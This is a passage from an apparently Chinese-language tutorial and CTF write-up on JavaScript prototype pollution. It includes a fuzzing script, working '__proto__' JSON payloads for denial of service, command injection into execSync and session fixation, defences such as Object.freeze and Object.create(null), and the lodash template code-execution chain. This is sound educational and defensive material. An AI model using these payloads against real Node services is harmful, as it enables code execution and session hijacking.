class="hljs-params">totest</span>) </span>&#123;totest(BAD_JSON);&#125;,sig: <span class="hljs-string">&quot;function (BAD_JSON)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(BAD_JSON, &#123;&#125;);&#125;,sig: <span class="hljs-string">&quot;function (BAD_JSON, &#123;&#125;)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(&#123;&#125;, BAD_JSON);&#125;,sig: <span class="hljs-string">&quot;function (&#123;&#125;, BAD_JSON)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(BAD_JSON, BAD_JSON);&#125;,sig: <span class="hljs-string">&quot;function (BAD_JSON, BAD_JSON)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(&#123;&#125;, &#123;&#125;, BAD_JSON);&#125;,sig: <span class="hljs-string">&quot;function (&#123;&#125;, &#123;&#125;, BAD_JSON)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(&#123;&#125;, &#123;&#125;, &#123;&#125;, BAD_JSON);&#125;,sig: <span class="hljs-string">&quot;function (&#123;&#125;, &#123;&#125;, &#123;&#125;, BAD_JSON)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(&#123;&#125;, <span class="hljs-string">&quot;__proto__.test&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);&#125;,sig: <span class="hljs-string">&quot;function (&#123;&#125;, BAD_PATH, VALUE)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(&#123;&#125;, <span class="hljs-string">&quot;__proto__[test]&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);&#125;,sig: <span class="hljs-string">&quot;function (&#123;&#125;, BAD_PATH, VALUE)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(<span class="hljs-string">&quot;__proto__.test&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);&#125;,sig: <span class="hljs-string">&quot;function (BAD_PATH, VALUE)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(<span class="hljs-string">&quot;__proto__[test]&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);&#125;,sig: <span class="hljs-string">&quot;function (BAD_PATH, VALUE)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(&#123;&#125;, <span class="hljs-string">&quot;__proto__&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);&#125;,sig: <span class="hljs-string">&quot;function (&#123;&#125;, BAD_STRING, BAD_STRING, VALUE)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(<span class="hljs-string">&quot;__proto__&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);&#125;,sig: <span class="hljs-string">&quot;function (BAD_STRING, BAD_STRING, VALUE)&quot;</span>&#125;]<span class="hljs-keyword">if</span> (args.length &lt; <span class="hljs-number">1</span>) &#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;First argument must be the library name&quot;</span>);exit();&#125;<span class="hljs-keyword">try</span> &#123;<span class="hljs-keyword">var</span> lib = <span class="hljs-built_in">require</span>(args[<span class="hljs-number">0</span>]);&#125; <span class="hljs-keyword">catch</span> (e) &#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Missing library : &quot;</span> + args[<span class="hljs-number">0</span>] );exit();&#125;<span class="hljs-keyword">var</span> parsedObject = [];<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploreLib</span>(<span class="hljs-params">lib, prefix, depth</span>) </span>&#123;<span class="hljs-keyword">if</span> (depth == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;<span class="hljs-keyword">if</span> (parsedObject.indexOf(lib) !== <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span>;parsedObject.push(lib);<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k <span class="hljs-keyword">in</span> lib) &#123;<span class="hljs-keyword">if</span> (k == <span class="hljs-string">&quot;abort&quot;</span>) <span class="hljs-keyword">continue</span>;<span class="hljs-keyword">if</span> (k == <span class="hljs-string">&quot;__proto__&quot;</span>) <span class="hljs-keyword">continue</span>;<span class="hljs-keyword">if</span> (+k == k) <span class="hljs-keyword">continue</span>;<span class="hljs-built_in">console</span>.log(k);<span class="hljs-keyword">if</span> (lib.hasOwnProperty(k)) &#123;<span class="hljs-keyword">for</span> (p <span class="hljs-keyword">in</span> pattern) &#123;<span class="hljs-keyword">if</span> (pattern.hasOwnProperty(p)) &#123;run(pattern[p].fnct, pattern[p].sig, prefix + <span class="hljs-string">&quot;.&quot;</span> + k, lib[k]);&#125;&#125;exploreLib(lib[k], prefix + <span class="hljs-string">&quot;.&quot;</span> + k, depth - <span class="hljs-number">1</span>);&#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> lib == <span class="hljs-string">&quot;function&quot;</span>) &#123;<span class="hljs-keyword">for</span> (p <span class="hljs-keyword">in</span> pattern) &#123;<span class="hljs-keyword">if</span> (pattern.hasOwnProperty(p)) &#123;run(pattern[p].fnct, pattern[p].sig, args[<span class="hljs-number">0</span>], lib);&#125;&#125;&#125;&#125;exploreLib(lib, args[<span class="hljs-number">0</span>], <span class="hljs-number">5</span>);</code></pre><p>摘自：<a href="https://github.com/HoLyVieR/prototype-pollution-nsec18">https://github.com/HoLyVieR/prototype-pollution-nsec18</a></p><h2 id="利用"><a class="header-anchor" href="#利用">🍭</a>利用</h2><h4 id="拒绝服务"><a class="header-anchor" href="#拒绝服务">🍭</a>拒绝服务</h4><p>JS中的Object默认带了一些属性,如toString和valueOf,利用原型链污染他们,可能导致整个程序停止运行</p><pre><code>toString()将Object转换为字符串格式返回,valueOf()返回数值或者bool值等</code></pre><p>{}<strong>proto</strong>.toString=“123”</p><p>{}<strong>proto</strong>.valueOf=“123”</p><p>server.js</p><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">var</span> app = express();<span class="hljs-keyword">var</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);app.use(bodyParser.json(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;application/*+json&#x27;</span> &#125;))app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;res.send(<span class="hljs-string">&quot;Use the POST method !&quot;</span>);&#125;);app.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;_.merge(&#123;&#125;, req.body);res.send(req.body);&#125;);app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Example app listening on port 3000!&#x27;</span>)&#125;);</code></pre><p>payload:</p><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;toString&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-attr">&quot;valueOf&quot;</span>:<span class="hljs-string">&quot;It works !&quot;</span>&#125;&#125;</code></pre><h4 id="for循环污染"><a class="header-anchor" href="#for循环污染">🍭</a>for循环污染</h4><p>就像下面的for循环,如果commands里面有,就可以执行恶意代码,污染等</p><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> execSync = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">runJobs</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">var</span> commands = &#123;<span class="hljs-string">&quot;script-1&quot;</span> : <span class="hljs-string">&quot;/bin/bash /opt/my-script-1.sh&quot;</span>,<span class="hljs-string">&quot;script-2&quot;</span> : <span class="hljs-string">&quot;/bin/bash /opt/my-script-2.sh&quot;</span>&#125;;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> scriptname <span class="hljs-keyword">in</span> commands) &#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Executing &quot;</span> + scriptname);execSync(commands[scriptname]);&#125;&#125;</code></pre><p>payload：</p><pre><code class="hljs jboss-cli">&#123;    “__proto__”:&#123;“my malicious <span class="hljs-keyword">command</span>”:”<span class="hljs-keyword">echo</span> yay &gt; <span class="hljs-string">/tmp/evil</span>”&#125;&#125;</code></pre><h4 id="属性注入"><a class="header-anchor" href="#属性注入">🍭</a>属性注入</h4><p>注意到,如果污染了某个类的prototype,那么那些没有被显式定义的对象都会受到影响.</p><p>NodeJS 的 http模块支持很多header同一个name.</p><p>所以如果污染了如cookie等.会造成很有意思的攻击.可能导致所有用户公用一个session</p><pre><code class="hljs routeros">&#123;“__proto__”:&#123;“cookie”:”<span class="hljs-attribute">sess</span>=fixedsessionid; <span class="hljs-attribute">garbage</span>=”&#125;&#125;</code></pre><h2 id="防御"><a class="header-anchor" href="#防御">🍭</a>防御</h2><h4 id="原型冻结"><a class="header-anchor" href="#原型冻结">🍭</a>原型冻结</h4><p>ECMAScript5标准中添加的一个特性.使用该特性后,对于对象属性的修改都将失败</p><p>eg:Object.freeze() 冻结对象, 冻结的对象无法再更改.我们无法添加，编辑或删除其中的属性</p><pre><code class="hljs pgsql"><span class="hljs-keyword">Object</span>.<span class="hljs-keyword">freeze</span>(<span class="hljs-keyword">Object</span>.prototype);<span class="hljs-keyword">Object</span>.<span class="hljs-keyword">freeze</span>(<span class="hljs-keyword">Object</span>);(&#123;&#125;).__proto__.test = <span class="hljs-number">123</span>(&#123;&#125;).test // this will be undefined</code></pre><h4 id="Schema-validation-of-JSON-input"><a class="header-anchor" href="#Schema-validation-of-JSON-input">🍭</a>Schema validation of JSON input</h4><p>NPM上的多个库(例如:avj)都为JSON数据提供了模式验证,可以在json规则里添加additionalProperties=false</p><h4 id="使用MAP代替Object"><a class="header-anchor" href="#使用MAP代替Object">🍭</a>使用MAP代替Object</h4><p>MAP是EcmaScript 6标准中新增的,需要使用key/value模式时,尽量用MAP</p><pre><code class="hljs maxima"><span class="hljs-number">1.</span>js创建<span class="hljs-built_in">map</span>对象<span class="hljs-built_in">var</span> <span class="hljs-built_in">map</span> = <span class="hljs-built_in">new</span> Map();<span class="hljs-number">2</span>.将键值对放入<span class="hljs-built_in">map</span>对象<span class="hljs-built_in">map</span>.set(<span class="hljs-string">&quot;key&quot;</span>,value)<span class="hljs-built_in">map</span>.set(<span class="hljs-string">&quot;key1&quot;</span>,value1)<span class="hljs-built_in">map</span>.set(<span class="hljs-string">&quot;key2&quot;</span>,value2)<span class="hljs-number">3</span>.根据<span class="hljs-built_in">key</span>获取<span class="hljs-built_in">map</span>值<span class="hljs-built_in">map</span>.<span class="hljs-built_in">get</span>(<span class="hljs-built_in">key</span>)<span class="hljs-number">4</span>.删除<span class="hljs-built_in">map</span>指定对象<span class="hljs-built_in">delete</span> <span class="hljs-built_in">map</span>[<span class="hljs-built_in">key</span>]或<span class="hljs-built_in">map</span>.<span class="hljs-built_in">delete</span>(<span class="hljs-built_in">key</span>)<span class="hljs-number">5</span>.循环遍历<span class="hljs-built_in">map</span><span class="hljs-built_in">map</span>.forEach(function(<span class="hljs-built_in">key</span>)&#123;　　console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-built_in">key</span>)  //输出的是<span class="hljs-built_in">map</span>中的value值&#125;)</code></pre><h4 id="Object-create-null"><a class="header-anchor" href="#Object-create-null">🍭</a>Object.create(null)</h4><p>可以用JavaScript创建没有任何原型的对象 : Object.create(null),用Object.creat创建的对象没有__proto__和constructor 以这种方式创建对象可以帮助减轻原型污染攻击</p><pre><code class="hljs dart"><span class="hljs-keyword">var</span> obj = <span class="hljs-built_in">Object</span>.create(<span class="hljs-keyword">null</span>);obj.__proto__ <span class="hljs-comment">// undefined</span>obj.constructor <span class="hljs-comment">// undefined</span></code></pre><h2 id="例题"><a class="header-anchor" href="#例题">🍭</a>例题</h2><h3 id="Code-Breaking-2018-Thejs"><a class="header-anchor" href="#Code-Breaking-2018-Thejs">🍭</a>Code-Breaking 2018 Thejs</h3><p>源码：</p><p><img src="/2021/04/18/js/2.png" alt="2"></p><p>lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：</p><ul><li><code>lodash.template</code> 一个简单的模板引擎</li><li><code>lodash.merge</code> 函数或对象的合并</li></ul><p>应用逻辑：用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存提交的所有信息。这里的<code>lodash.merge</code>操作就存在原型链污染漏洞。</p><p>在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的<code>lodash.template</code>中。<code>lodash.template</code>的代码：<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><pre><code class="hljs php"><span class="hljs-comment">// Use a sourceURL for easier debugging.</span><span class="hljs-keyword">var</span> sourceURL = <span class="hljs-string">&#x27;sourceURL&#x27;</span> in options ? <span class="hljs-string">&#x27;//# sourceURL=&#x27;</span> + options.sourceURL + <span class="hljs-string">&#x27;\n&#x27;</span> : <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">// ...</span><span class="hljs-keyword">var</span> result = attempt(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">Function</span>(<span class="hljs-params">importsKeys, sourceURL + <span class="hljs-string">&#x27;return &#x27;</span> + source</span>)</span><span class="hljs-function">  .<span class="hljs-title">apply</span>(<span class="hljs-params">undefined, importsValues</span>)</span>;&#125;);</code></pre><p>options是一个对象，sourceURL取到了其<code>options.sourceURL</code>属性。这个属性原本是没有赋值的，默认取空字符串。我们可以给所有Object对象中都插入一个<code>sourceURL</code>属性。最后，这个<code>sourceURL</code>被拼接进<code>new Function</code>的第二个参数中，造成任意代码执行漏洞。将带有<code>__proto__</code>的Payload以json的形式发送给后端，因为express框架支持根据Content-Type来解析请求Body：</p><p><img src="/2021/04/18/js/3.png" alt="3"></p><p>返回了id命令。</p><h3 id="hackit-2018"><a class="header-anchor" href="#hackit-2018">🍭</a>hackit 2018</h3><p>源码:</p><pre><code class="hljs yaml"><span class="hljs-string">const</span> <span class="hljs-string">express</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;express&#x27;)</span>         <span class="hljs-string">//关于require，require是一个函数</span><span class="hljs-string">var</span> <span class="hljs-string">hbs</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;hbs&#x27;);</span><span class="hljs-string">var</span> <span class="hljs-string">bodyParser</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;body-parser&#x27;);</span><span class="hljs-string">const</span> <span class="hljs-string">md5</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;md5&#x27;);</span><span class="hljs-string">var</span> <span class="hljs-string">morganBody</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;morgan-body&#x27;);</span><span class="hljs-string">const</span> <span class="hljs-string">app</span> <span class="hljs-string">=</span> <span class="hljs-string">express();</span><span class="hljs-string">var</span> <span class="hljs-string">user</span> <span class="hljs-string">=</span> []<span class="hljs-string">;</span> <span class="hljs-string">//empty</span> <span class="hljs-string">for</span> <span class="hljs-string">now</span><span class="hljs-string">var</span> <span class="hljs-string">matrix</span> <span class="hljs-string">=</span> []<span class="hljs-string">;</span><span class="hljs-string">for</span> <span class="hljs-string">(var</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">i++)&#123;</span>    <span class="hljs-string">matrix[i]</span> <span class="hljs-string">=</span> [<span class="hljs-literal">null</span> , <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<span class="hljs-string">;</span><span class="hljs-string">&#125;</span><span class="hljs-string">function</span> <span class="hljs-string">draw(mat)</span> &#123;    <span class="hljs-string">var</span> <span class="hljs-string">count</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span>    <span class="hljs-string">for</span> <span class="hljs-string">(var</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">i++)</span>&#123;        <span class="hljs-string">for</span> <span class="hljs-string">(var</span> <span class="hljs-string">j</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">j</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">j++)</span>&#123;            <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-string">j</span>] <span class="hljs-type">!==</span> <span class="hljs-literal">null</span><span class="hljs-string">)</span>&#123;                <span class="hljs-string">count</span> <span class="hljs-string">+=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>            &#125;        &#125;    &#125;    <span class="hljs-string">return</span> <span class="hljs-string">count</span> <span class="hljs-string">===</span> <span class="hljs-number">9</span><span class="hljs-string">;</span>&#125;<span class="hljs-string">app.use(express.static(&#x27;public&#x27;));</span><span class="hljs-string">app.use(bodyParser.json());</span><span class="hljs-string">app.set(&#x27;view</span> <span class="hljs-string">engine&#x27;,</span> <span class="hljs-string">&#x27;html&#x27;</span><span class="hljs-string">);</span><span class="hljs-string">morganBody(app);</span><span class="hljs-string">app.engine(&#x27;html&#x27;,</span> <span class="hljs-string">require(&#x27;hbs&#x27;).__express);</span><span class="hljs-string">app.get(&#x27;/&#x27;,</span> <span class="hljs-string">(req,</span> <span class="hljs-string">res)</span> <span class="hljs-string">=&gt;</span> &#123;    <span class="hljs-string">for</span> <span class="hljs-string">(var</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">i++)</span>&#123;        <span class="hljs-string">matrix</span>[<span class="hljs-string">i</span>] <span class="hljs-string">=</span> [<span class="hljs-literal">null</span> , <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<span class="hljs-string">;</span>    &#125;    <span class="hljs-string">res.render(&#x27;index&#x27;);</span>&#125;<span class="hljs-string">)</span><span class="hljs-string">app.get(&#x27;/admin&#x27;,</span> <span class="hljs-string">(req,</span> <span class="hljs-string">res)</span> <span class="hljs-string">=&gt;</span> &#123;     <span class="hljs-string">/*this</span> <span class="hljs-string">is</span> <span class="hljs-string">under</span> <span class="hljs-string">development</span> <span class="hljs-string">I</span> <span class="hljs-string">guess</span> <span class="hljs-string">??*/</span>    <span class="hljs-string">console.log(user.admintoken);</span>    <span class="hljs-string">if(user.admintoken</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">req.query.querytoken</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">md5(user.admintoken)</span> <span class="hljs-string">===</span> <span class="hljs-string">req.query.querytoken)</span>&#123;        <span class="hljs-string">res.send(&#x27;Hey</span> <span class="hljs-string">admin</span> <span class="hljs-string">your</span> <span class="hljs-string">flag</span> <span class="hljs-string">is</span> <span class="hljs-string">&lt;b&gt;flag</span>&#123;<span class="hljs-string">prototype_pollution_is_very_dangerous</span>&#125;<span class="hljs-string">&lt;/b&gt;&#x27;);</span>    &#125;     <span class="hljs-string">else</span> &#123;        <span class="hljs-string">res.status(403).send(&#x27;Forbidden&#x27;);</span>    &#125;    &#125;<span class="hljs-string">)</span><span class="hljs-string">app.post(&#x27;/api&#x27;,</span> <span class="hljs-string">(req,</span> <span class="hljs-string">res)</span> <span class="hljs-string">=&gt;</span> &#123;    <span class="hljs-string">var</span> <span class="hljs-string">client</span> <span class="hljs-string">=</span> <span class="hljs-string">req.body;</span>    <span class="hljs-string">var</span> <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-literal">null</span><span class="hljs-string">;</span>    <span class="hljs-string">if</span> <span class="hljs-string">(client.row</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">3</span> <span class="hljs-string">||</span> <span class="hljs-string">client.col</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">3</span><span class="hljs-string">)</span>&#123;        <span class="hljs-string">client.row</span> <span class="hljs-string">%=</span> <span class="hljs-number">3</span><span class="hljs-string">;</span>        <span class="hljs-string">client.col</span> <span class="hljs-string">%=</span> <span class="hljs-number">3</span><span class="hljs-string">;</span>    &#125;    <span class="hljs-string">matrix</span>[<span class="hljs-string">client.row</span>][<span class="hljs-string">client.col</span>] <span class="hljs-string">=</span> <span class="hljs-string">client.data;</span>    <span class="hljs-string">for(var</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">i++)</span>&#123;        <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">2</span>] <span class="hljs-string">)</span>&#123;            <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;X&#x27;</span><span class="hljs-string">)</span> &#123;                <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>            &#125;            <span class="hljs-string">else</span> <span class="hljs-string">if(matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;O&#x27;</span><span class="hljs-string">)</span> &#123;                <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">2</span><span class="hljs-string">;</span>            &#125;        &#125;        <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-string">i</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-string">i</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-string">i</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-string">i</span>]<span class="hljs-string">)</span>&#123;            <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-string">i</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;X&#x27;</span><span class="hljs-string">)</span> &#123;                <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>            &#125;            <span class="hljs-string">else</span> <span class="hljs-string">if(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-string">i</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;O&#x27;</span><span class="hljs-string">)</span> &#123;                <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">2</span><span class="hljs-string">;</span>            &#125;        &#125;    &#125;    <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;X&#x27;</span><span class="hljs-string">)</span>&#123;        <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>    &#125;    <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;O&#x27;</span><span class="hljs-string">)</span>&#123;        <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">2</span><span class="hljs-string">;</span>    &#125;     <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;X&#x27;</span><span class="hljs-string">)</span>&#123;        <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>    &#125;    <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;O&#x27;</span><span class="hljs-string">)</span>&#123;        <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">2</span><span class="hljs-string">;</span>    &#125;    <span class="hljs-string">if</span> <span class="hljs-string">(draw(matrix)</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">winner</span> <span class="hljs-string">===</span> <span class="hljs-literal">null</span><span class="hljs-string">)</span>&#123;        <span class="hljs-string">res.send(JSON.stringify(</span>&#123;<span class="hljs-attr">winner:</span> <span class="hljs-number">0</span>&#125;<span class="hljs-string">))</span>    &#125;    <span class="hljs-string">else</span> <span class="hljs-string">if</span> <span class="hljs-string">(winner</span> <span class="hljs-type">!==</span> <span class="hljs-literal">null</span><span class="hljs-string">)</span> &#123;        <span class="hljs-string">res.send(JSON.stringify(</span>&#123;<span class="hljs-attr">winner:</span> <span class="hljs-string">winner</span>&#125;<span class="hljs-string">))</span>    &#125;    <span class="hljs-string">else</span> &#123;        <span class="hljs-string">res.send(JSON.stringify(</span>&#123;<span class="hljs-attr">winner:</span> <span class="hljs-number">-1</span>&#125;<span class="hljs-string">))</span>    &#125;&#125;<span class="hljs-string">)</span><span class="hljs-string">app.listen(3000,</span> <span class="hljs-string">()</span> <span class="hljs-string">=&gt;</span> &#123;    <span 